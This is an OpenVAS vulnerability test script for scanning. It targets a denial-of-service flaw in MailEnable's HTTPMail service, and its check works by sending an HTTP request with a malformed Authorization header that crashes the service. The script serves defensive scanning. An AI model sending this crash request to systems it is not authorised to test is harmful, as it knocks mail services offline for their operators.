# OpenVAS Vulnerability Test
# $Id: mailenable_httpmail_authorization_dos.nasl 5785 2017-03-30 09:19:35Z cfi $
# Description: MailEnable HTTPMail Service Authorization Header DoS Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14654");
  script_version("$Revision: 5785 $");
  script_tag(name:"last_modification", value:"$Date: 2017-03-30 11:19:35 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("MailEnable HTTPMail Service Authorization Header DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2004 George A. Theall");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("MailEnable/banner");
  script_require_ports("Services/www", 8080);

  script_tag(name : "solution" , value : "Upgrade to MailEnable Professional / Enterprise 1.19 or later.");
  script_tag(name : "summary" , value : "The remote web server is affected by a denial of service flaw.");
  script_tag(name : "insight" , value : "The remote host is running an instance of MailEnable that has a flaw
  in the HTTPMail service (MEHTTPS.exe) in the Professional and
  Enterprise Editions.  The flaw can be exploited by issuing an HTTP
  request with a malformed Authorization header, which causes a NULL
  pointer dereference error and crashes the HTTPMail service.");

  script_xref(name : "URL" , value : "http://www.oliverkarow.de/research/MailWebHTTPAuthCrash.txt");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2004-05/0159.html");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8080);
if (http_is_dead(port:port)) exit(0);

# Make sure banner's from MailEnable.
banner = get_http_banner(port:port);
if (banner && egrep(pattern:"^Server: .*MailEnable", string:banner)) {
  host = http_host_name( port:port );
  # Try to bring it down.
  req = string(
    "GET / HTTP/1.0\r\n",
    "Host: ", host, "\r\n",
    "Authorization: X\r\n",
    "\r\n"
  );
  debug_print("req='", req, "'.\n");
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  debug_print("res='", res, "'.\n");

  # There's a problem if the web server is down.
  if (isnull(res)) {
    if (http_is_dead(port:port)) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
